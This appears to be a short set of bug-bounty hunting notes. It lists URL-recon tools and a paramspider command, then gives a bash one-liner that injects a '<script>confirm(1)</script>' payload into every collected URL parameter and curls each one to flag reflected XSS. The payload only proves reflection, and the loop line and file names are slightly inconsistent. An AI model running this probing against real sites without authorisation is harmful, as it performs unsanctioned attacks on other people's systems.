<h1>Some hunting scripts</h1>

## Tools:
https://github.com/tomnomnom/gf
https://github.com/tomnomnom/waybackurls
https://github.com/lc/gau
https://github.com/tomnomnom/qsreplace
https://github.com/projectdiscovery/httpx
https://github.com/tomnomnom/httprobe
https://github.com/tomnomnom/anew

## Find and testing XSS

```bash
python3 paramspider.py -d domain.com
```

### Output file has stored on output/domain.com.txt

```bash
cat jora.com.txt | gf xss | qsreplace '"><script>confirm(1)</script>' | while read host do; do curl --silent --insecure $host | grep -qs "<script>confirm(1)" && echo "[*] XSS HERE $host"; done
```
